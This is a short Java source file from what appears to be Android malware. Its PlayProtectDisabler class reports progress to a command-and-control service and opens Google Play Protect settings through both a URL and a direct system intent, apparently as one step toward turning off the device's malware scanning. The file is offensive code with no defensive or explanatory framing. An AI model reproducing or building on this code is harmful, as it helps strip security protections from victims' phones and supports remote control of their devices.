package com.wuzenx.engine;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;

import com.wuzenx.C2Service;

public class PlayProtectDisabler {
    private Context context;
    private C2Service c2;
    private Handler handler = new Handler(Looper.getMainLooper());

    public PlayProtectDisabler(Context context, C2Service c2) {
        this.context = context;
        this.c2 = c2;
    }

    public void start() {
        c2.sendMessage("log", "Disabling Play Protect...");
        try {
            // Open Play Store settings for Play Protect
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setData(Uri.parse(
                "https://play.google.com/settings/protect"));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);

            // Also try direct intent to Play Protect settings
            try {
                Intent direct = new Intent();
                direct.setClassName(
                    "com.google.android.gms",
                    "com.google.android.gms.security.settings." +
                    "VerifyAppsSettingsActivity");
                direct.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(direct);
            } catch (Exception ignored) {}

            c2.sendMessage("log", "Play Protect settings opened");
        } catch (Exception e) {
            c2.sendMessage("log",
                "Failed to open Play Protect: " + e.getMessage());
        }
    }
}
